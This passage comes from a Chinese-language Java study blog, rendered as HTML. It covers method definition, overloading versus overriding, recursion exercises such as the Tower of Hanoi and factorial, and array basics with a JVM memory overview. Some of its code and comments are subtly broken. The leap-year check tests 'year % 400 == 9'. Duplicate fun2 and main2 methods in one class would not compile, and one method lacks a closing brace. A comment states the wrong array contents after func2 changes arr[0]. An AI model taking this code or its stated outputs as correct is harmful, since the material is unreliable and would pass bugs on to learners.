class="comment"> * Data: 2023-05-30</span></span><br><span class="line"><span class="comment"> * Time: 16:11</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">fangfa1</span> &#123;</span><br><span class="line">    <span class="comment">//闰年</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="type">boolean</span> <span class="title function_">isiLeapYear</span><span class="params">(<span class="type">int</span> year)</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> ((year % <span class="number">4</span> == <span class="number">0</span>) &amp;&amp; (year % <span class="number">100</span> != <span class="number">0</span>) || (year % <span class="number">400</span> == <span class="number">9</span>)) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">//方法定义</span></span><br><span class="line">    <span class="comment">//修饰符 返回值类型 方法名称([参数类型 形参])&#123;</span></span><br><span class="line">    <span class="comment">// 方法代码块</span></span><br><span class="line">    <span class="comment">//[return 返回值];</span></span><br><span class="line">    <span class="comment">// &#125;</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">add</span><span class="params">(<span class="type">int</span> a, <span class="type">int</span> b)</span> &#123;</span><br><span class="line">        System.out.println(a + b);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main1</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">int</span> <span class="variable">x</span> <span class="operator">=</span> <span class="number">1</span>;</span><br><span class="line">        <span class="type">int</span> <span class="variable">y</span> <span class="operator">=</span> <span class="number">1</span>;</span><br><span class="line">        <span class="type">int</span> <span class="variable">year</span> <span class="operator">=</span> <span class="number">2021</span>;</span><br><span class="line">        <span class="comment">//System.out.println(isiLeapYear(year));</span></span><br><span class="line">        <span class="comment">//int ret = add(x, y);//实际参数 ret：接收方法得返回值</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h1 id="方法的重载与重写的区别"><a href="#方法的重载与重写的区别" class="headerlink" title="方法的重载与重写的区别"></a>方法的重载与重写的区别</h1><p>方法重写是存在子父类之间的,子类定义的方法与父类中的方法具有相同的方法名字,相同的参数表和相同的返回类型 </p><p>方法重载是指同一个类中的多个方法具有相同的名字,但这些方法具有不同的参数列表,即参数的数量或参数类型不能完全相同</p><ol><li>方法的名称必须一样</li><li>方法的参数不一样 [数据类型， 个数， 顺序]</li><li>返回值没有要求</li><li>签名使得同名的方法可以区别</li></ol><h1 id="递归"><a href="#递归" class="headerlink" title="递归"></a>递归</h1><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Created with IntelliJ IDEA</span></span><br><span class="line"><span class="comment"> * Description</span></span><br><span class="line"><span class="comment"> * User: yxz</span></span><br><span class="line"><span class="comment"> * Data: 2023-05-30</span></span><br><span class="line"><span class="comment"> * Time: 20:20</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">digui</span> &#123;</span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 汉诺塔</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> pos1 起始位置</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> pos2 中转位置</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> pos3 目标位置</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> n</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">hanio</span><span class="params">(<span class="type">int</span> n, <span class="type">char</span> pos1, <span class="type">char</span> pos2, <span class="type">char</span> pos3)</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (n == <span class="number">1</span>) &#123;</span><br><span class="line">            move(pos1, pos3);</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        hanio(n - <span class="number">1</span>, pos1, pos3, pos2);</span><br><span class="line">        move(pos1, pos3);</span><br><span class="line">        hanio(n - <span class="number">1</span>, pos2, pos1, pos3);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> pos1 起始位置</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> pos2 目标位置</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">move</span><span class="params">(<span class="type">char</span> pos1, <span class="type">char</span> pos2)</span> &#123;</span><br><span class="line">        System.out.print(pos1 + <span class="string">&quot; -&gt; &quot;</span> + pos2 + <span class="string">&quot; &quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//求1 +...+n;</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="type">int</span> <span class="title function_">fun2</span><span class="params">(<span class="type">int</span> n)</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (n == <span class="number">1</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> n + fun2(n - <span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main2</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        hanio(<span class="number">1</span>, <span class="string">&#x27;A&#x27;</span>, <span class="string">&#x27;B&#x27;</span>, <span class="string">&#x27;C&#x27;</span>);</span><br><span class="line">        System.out.println();</span><br><span class="line">        hanio(<span class="number">2</span>, <span class="string">&#x27;A&#x27;</span>, <span class="string">&#x27;B&#x27;</span>, <span class="string">&#x27;C&#x27;</span>);</span><br><span class="line">        System.out.println();</span><br><span class="line">        hanio(<span class="number">3</span>, <span class="string">&#x27;A&#x27;</span>, <span class="string">&#x27;B&#x27;</span>, <span class="string">&#x27;C&#x27;</span>);</span><br><span class="line">        System.out.println();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//求1 +...+n;</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="type">int</span> <span class="title function_">fun2</span><span class="params">(<span class="type">int</span> n)</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (n == <span class="number">1</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> n + fun2(n - <span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//求数字的各位数之和</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="type">int</span> <span class="title function_">sum</span><span class="params">(<span class="type">int</span> n)</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (n &lt; <span class="number">10</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> n;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="type">int</span> <span class="variable">tmp</span> <span class="operator">=</span> n % <span class="number">10</span> + sum(n / <span class="number">10</span>);</span><br><span class="line">        <span class="keyword">return</span> tmp;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//按顺序打印数字的每一位,</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">print</span><span class="params">(<span class="type">int</span> num)</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (num &gt; <span class="number">9</span>) &#123;</span><br><span class="line">            print(num / <span class="number">10</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            System.out.println(num % <span class="number">10</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">//阶乘</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="type">int</span> <span class="title function_">fac</span><span class="params">(<span class="type">int</span> n)</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (n == <span class="number">1</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="type">int</span> <span class="variable">tmp</span> <span class="operator">=</span> n * fac(n - <span class="number">1</span>);</span><br><span class="line">        <span class="keyword">return</span> tmp;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main3</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        System.out.println(fac(<span class="number">5</span>));</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">function</span><span class="params">(<span class="type">int</span> a)</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (a == <span class="number">1</span>) &#123;</span><br><span class="line">            System.out.println(a);</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        function(a - <span class="number">1</span>);</span><br><span class="line">        System.out.println(a);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main2</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        function(<span class="number">10</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 求俩个整数的最大值</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> a</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> b</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@return</span></span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="type">int</span> <span class="title function_">max2</span><span class="params">(<span class="type">int</span> a, <span class="type">int</span> b)</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> a &gt; b ? a : b;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 求三个数的最大值</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> a</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> b</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> c</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@return</span></span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="type">int</span> <span class="title function_">max3</span><span class="params">(<span class="type">int</span> a, <span class="type">int</span> b, <span class="type">int</span> c)</span> &#123;</span><br><span class="line">        <span class="type">int</span> <span class="variable">max</span> <span class="operator">=</span> max2(a, b);</span><br><span class="line">        <span class="keyword">return</span> max &gt; c ? max : c;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//重载写法</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="type">int</span> <span class="title function_">max</span><span class="params">(<span class="type">int</span> a, <span class="type">int</span> b, <span class="type">int</span> c)</span> &#123;</span><br><span class="line">        <span class="type">int</span> <span class="variable">ret</span> <span class="operator">=</span> max2(a, b);</span><br><span class="line">        <span class="keyword">return</span> ret &gt; c ? ret : c;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//fib</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="type">int</span> <span class="title function_">fib</span><span class="params">(<span class="type">int</span> n)</span> &#123;</span><br><span class="line">        <span class="type">int</span> <span class="variable">f1</span> <span class="operator">=</span> <span class="number">1</span>;</span><br><span class="line">        <span class="type">int</span> <span class="variable">f2</span> <span class="operator">=</span> <span class="number">1</span>;</span><br><span class="line">        <span class="type">int</span> <span class="variable">f3</span> <span class="operator">=</span> <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">3</span>; i &lt;= n; i++) &#123;</span><br><span class="line">            f3 = f1 + f2;</span><br><span class="line">            f1 = f2;</span><br><span class="line">            f2 = f3;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> f3;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="type">int</span> <span class="title function_">fib1</span><span class="params">(<span class="type">int</span> n)</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (n == <span class="number">1</span> || n == <span class="number">2</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> fib1(n - <span class="number">1</span>)  +  fib( n - <span class="number">2</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main1</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        System.out.println(fib1(<span class="number">1</span>));</span><br><span class="line">        System.out.println(fib1(<span class="number">2</span>));</span><br><span class="line">        System.out.println(fib1(<span class="number">5</span>));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h1 id="数组"><a href="#数组" class="headerlink" title="数组"></a>数组</h1><p>数组是有一种引用数据类型</p><h2 id="基本定义"><a href="#基本定义" class="headerlink" title="基本定义"></a>基本定义</h2><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Arr</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">int</span>[] arr1 = &#123;<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>&#125;;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; arr1.length; i++) &#123;</span><br><span class="line">            System.out.print(arr1[i] + <span class="string">&quot; &quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        System.out.println();</span><br><span class="line">        <span class="comment">// 数组当中数据类型定义的变量  : 数组名 ，但拿不到数组下标</span></span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> x: arr1) &#123;</span><br><span class="line">            System.out.print(x + <span class="string">&quot; &quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        System.out.println();</span><br><span class="line">        <span class="comment">//专门用来操作数组 Array 需要导入一个包</span></span><br><span class="line">        <span class="comment">//把数组转变为字符串，然后返回</span></span><br><span class="line">        <span class="type">String</span> <span class="variable">ret</span> <span class="operator">=</span> Arrays.toString(arr1);</span><br><span class="line">        System.out.println(ret);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main2</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">double</span> arr1[] = <span class="keyword">new</span> <span class="title class_">double</span>[<span class="number">1</span>];<span class="comment">//0.0</span></span><br><span class="line">        <span class="type">float</span> arr2[] = <span class="keyword">new</span> <span class="title class_">float</span>[<span class="number">1</span>];<span class="comment">//0.0f</span></span><br><span class="line">        System.out.println(arr1[<span class="number">0</span>]);</span><br><span class="line">        System.out.println(arr2[<span class="number">0</span>]);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main1</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">int</span> <span class="variable">a1</span> <span class="operator">=</span> <span class="number">1</span>;</span><br><span class="line">        <span class="type">int</span> <span class="variable">a2</span> <span class="operator">=</span> <span class="number">2</span>;</span><br><span class="line">        <span class="type">int</span> <span class="variable">a3</span> <span class="operator">=</span> <span class="number">3</span>;</span><br><span class="line">        <span class="type">int</span>[] arr = &#123;a1, a2, a3&#125;;</span><br><span class="line">        <span class="type">int</span>[] arr2 = &#123;<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>&#125;;<span class="comment">//直接赋值</span></span><br><span class="line">        <span class="type">int</span>[] arr3 = <span class="keyword">new</span> <span class="title class_">int</span>[]&#123;<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>&#125;;<span class="comment">//动态初始化</span></span><br><span class="line">        <span class="comment">//没有本质区别，只有写法上的区别.</span></span><br><span class="line">        <span class="type">int</span>[] arr4 = <span class="keyword">new</span> <span class="title class_">int</span>[<span class="number">10</span>];<span class="comment">//分配空间，默认值0或0.0,boolean是false</span></span><br><span class="line">        System.out.println(arr4[<span class="number">1</span>]);</span><br><span class="line">        <span class="type">int</span> <span class="variable">len</span> <span class="operator">=</span> arr3.length;</span><br><span class="line">        System.out.println(arr[<span class="number">2</span>]);</span><br><span class="line">        System.out.println(len);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><h2 id="数组（引用类型和应用场景）"><a href="#数组（引用类型和应用场景）" class="headerlink" title="数组（引用类型和应用场景）"></a>数组（引用类型和应用场景）</h2><p><img src="https://s2.loli.net/2023/06/04/KaNcYtfUGvEML1r.png" alt="image.png"></p><ul><li><p><em>程序计数器</em>（PC Register）：只是一个很小的空间，保存下一条执行的指令的地址</p></li><li><p><em>虚拟机栈</em>（JVM Stack）：与方法调用相关的一些信息，每个方法在执行时，都会先创建一个栈帧，栈帧中包含有：局部变量表、操作数栈、动态链接、返回地址以及其他的一些信息，保存的都是与方法执行时相关的一些信息。比如：局部变量。当方法运行结束后，栈帧就被销毁了，即栈帧中保存的数据也被销毁了。</p></li><li><p><em>本地方法栈</em>（Native Method Stack）：本地方法栈与虚拟机栈的作用类似.只不过保存的内容是Native方法的局部变量.在有些版本的JVM实现中（例如HotSpot），本地方法栈和虚拟机栈是一起的</p></li><li><p><em>堆</em>（Heap）：JVM所管理的最大内存区域．使用new 创建的对象都是在堆上保存（例如前面的 new int［］（1，2，31），堆是随着程序开始运行时而创建，随着程序的退出而销毁，堆中的数据只要还有在使用，就不会被销毁。</p></li><li><p><em>方法区</em>（Method Area）：用于存储已被虚拟机加载的类信息、常量、静态变量、即时编译器编译后的代码等数据.方法编译出的的字节码就是保存在这个区域</p></li></ul><p>现在我们只简单关心堆和虚拟机栈这两块空间，后序JVM中还会更详细介绍。</p><p><img src="https://s2.loli.net/2023/06/04/XHIdJgRlSf8wWvZ.png" alt="image.png"></p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Arr</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main7</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">int</span>[] arr = <span class="literal">null</span>;<span class="comment">//引用对象的0值，代表这个引用不指向任何对象</span></span><br><span class="line">        <span class="comment">//System.out.println(arr[0]);没对象，哪来的长度,空指针异常</span></span><br><span class="line">        <span class="comment">//所以不能进行读写操作，否则抛出NullPointException</span></span><br><span class="line">        System.out.println(arr);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main6</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">       <span class="comment">//一个引用不能指向多个对象，但一个对象可以被多个引用指向</span></span><br><span class="line">        <span class="type">int</span>[] arr = &#123;<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>&#125;;</span><br><span class="line">        <span class="type">int</span>[] arr2 = &#123;<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>,<span class="number">7</span>&#125;;</span><br><span class="line">        arr = arr2; <span class="comment">//arr没了，此时没人引用&#123;1，2，3，4&#125;就自动回收了</span></span><br><span class="line">        System.out.println(Arrays.toString(arr));<span class="comment">//[3, 4, 5, 7]</span></span><br><span class="line">        System.out.println(Arrays.toString(arr2));<span class="comment">//[3, 4, 5, 7]</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main5</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">int</span>[] arr = &#123;<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>&#125;;</span><br><span class="line">        System.out.println(Arrays.toString(arr));</span><br><span class="line"></span><br><span class="line">        <span class="type">int</span>[] arr2 = arr;<span class="comment">//arr2这个引用指向了arr引用所引用的对象</span></span><br><span class="line">        arr2[<span class="number">1</span>] = <span class="number">99</span>;<span class="comment">//改arr2 arr也会变</span></span><br><span class="line">        System.out.println(Arrays.toString(arr));<span class="comment">//[1, 99, 3, 4]</span></span><br><span class="line">        System.out.println(Arrays.toString(arr2));<span class="comment">//[1, 99, 3, 4]</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main4</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">int</span>[] arr = <span class="keyword">new</span> <span class="title class_">int</span>[<span class="number">100</span>];</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; arr.length; i++) &#123;</span><br><span class="line">            arr[i] = i + <span class="number">1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        System.out.println(Arrays.toString(arr));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="数组的应用场景"><a href="#数组的应用场景" class="headerlink" title="数组的应用场景"></a>数组的应用场景</h2><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">func1</span><span class="params">(<span class="type">int</span>[] arr)</span> &#123;</span><br><span class="line">        arr = <span class="keyword">new</span> <span class="title class_">int</span>[<span class="number">10</span>];</span><br><span class="line">        <span class="comment">//System.out.println(Arrays.toString(arr));[0...0]</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">func2</span><span class="params">(<span class="type">int</span>[] arr)</span> &#123;</span><br><span class="line">        arr[<span class="number">0</span>] = <span class="number">99</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">int</span>[] arr = &#123;<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>&#125;;</span><br><span class="line">        func1(arr);</span><br><span class="line">        System.out.println(Arrays.toString(arr));<span class="comment">//[1,2,3,4]</span></span><br><span class="line">        func2(arr);</span><br><span class="line">        System.out.println(Arrays.toString(arr));<span class="comment">//[1,2,3,4]</span></span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p><img src="https://s2.loli.net/2023/06/04/fK4B8Q6mEdYbo5N.png" alt="image.png"></p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// int[] arr = &#123; 1, 2,3 ,4&#125;;//整体初始化只有一次机会！就是在定义的同时初始化；</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">swap</span><span class="params">(<span class="type">int</span>[] array)</span> &#123;</span><br><span class="line">        <span class="type">int</span> <span class="variable">tmp</span> <span class="operator">=</span> array[<span class="number">0</span>];</span><br><span class="line">        array[<span class="number">0</span>] = array[<span class="number">1</span>];</span><br><span class="line">        array[<span class="number">1</span>] = tmp;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">int</span>[] tmp = &#123; <span class="number">1</span>, <span class="number">2</span>&#125;;</span><br><span class="line">        System.out.println(<span class="string">&quot;交换前： &quot;</span> + tmp[<span class="number">0</span>] + <span class="string">&quot; &quot;</span> + tmp[<span class="number">1</span>]);</span><br><span class="line">        swap(tmp);</span><br><span class="line">        System.out.println(<span class="string">&quot;交换后： &quot;</span>+ tmp[<span class="number">0</span>] + <span class="string">&quot; &quot;</span> + tmp[<span class="number">1</span>]);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="type">int</span>[] func3() &#123;<span class="comment">//返回一整个数组</span></span><br><span class="line">        <span class="type">int</span>[] tmp = &#123;<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>,<span class="number">6</span>,<span class="number">7</span>,<span class="number">8</span>,<span class="number">9</span>&#125;;</span><br><span class="line">        <span class="keyword">return</span> tmp;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main2</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">int</span>[] ret = func3();</span><br><span class="line">        System.out.println(Arrays.toString(ret));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><ol><li>数组对象是在堆上的</li><li>引用变量目前是在main函数里面的，属于局部变量，当函数结束或就会被收回内存</li><li>是变量被回收后，对象没人引用了，自动回收了，fun函数里的地址和main函数里的地址不同，fun里的回收后，对象还在，但fun里有队arr的操作会保存下来，因为对象被改变了。</li></ol><h3 id="练习"><a href="#练习" class="headerlink" title="练习"></a>练习</h3><h4 id="数组转字符串"><a href="#数组转字符串" class="headerlink" title="数组转字符串"></a>数组转字符串</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> String <span class="title function_">myToString</span><span class="params">(<span class="type">int</span>[] tmp)</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (tmp == <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;null&quot;</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="type">String</span> <span class="variable">ret</span> <span class="operator">=</span> <span class="string">&quot;[&quot;</span>;</span><br><span class="line">            <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; tmp.length; i++) &#123;</span><br><span class="line">                ret = ret + tmp[i];</span><br><span class="line">                <span class="keyword">if</span> (i != tmp.length - <span class="number">1</span>) &#123;</span><br><span class="line">                    ret += <span class="string">&quot;,&quot;</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            ret = ret + <span class="string">&quot;]&quot;</span>;</span><br><span class="line">            <span class="keyword">return</span> ret;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">int</span>[] array = &#123;<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>&#125;;</span><br><span class="line">        <span class="type">int</span>[] arr2 = <span class="literal">null</span>;</span><br><span class="line">        <span class="type">String</span> <span class="variable">ret1</span> <span class="operator">=</span> myToString(array);</span><br><span class="line">        String ret2= myToString(arr2);</span><br><span class="line">        System.out.println(ret1);</span><br><span class="line">        System.out.println(ret2);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>法二</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> String <span class="title function_">toString</span><span class="params">(<span class="type">int</span>[] arr)</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (arr == <span class="literal">null</span>)</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;null&quot;</span>;</span><br><span class="line">        <span class="type">int</span> <span class="variable">iMax</span> <span class="operator">=</span> arr.length - <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">if</span> (iMax == -<span class="number">1</span>)</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;[]&quot;</span>;</span><br><span class="line">        <span class="type">StringBuilder</span> <span class="variable">b</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">StringBuilder</span>();</span><br><span class="line">        b.append(<span class="string">&#x27;[&#x27;</span>);</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>  ; ; i++) &#123;</span><br><span class="line">            b.append(arr[i]);</span><br><span class="line">            <span class="keyword">if</span> (i == iMax)</span><br><span class="line">                <span class="keyword">return</span> b.append(<span class="string">&#x27;]&#x27;</span>).toString();</span><br><span class="line">            b.append(<span class="string">&quot;, &quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span 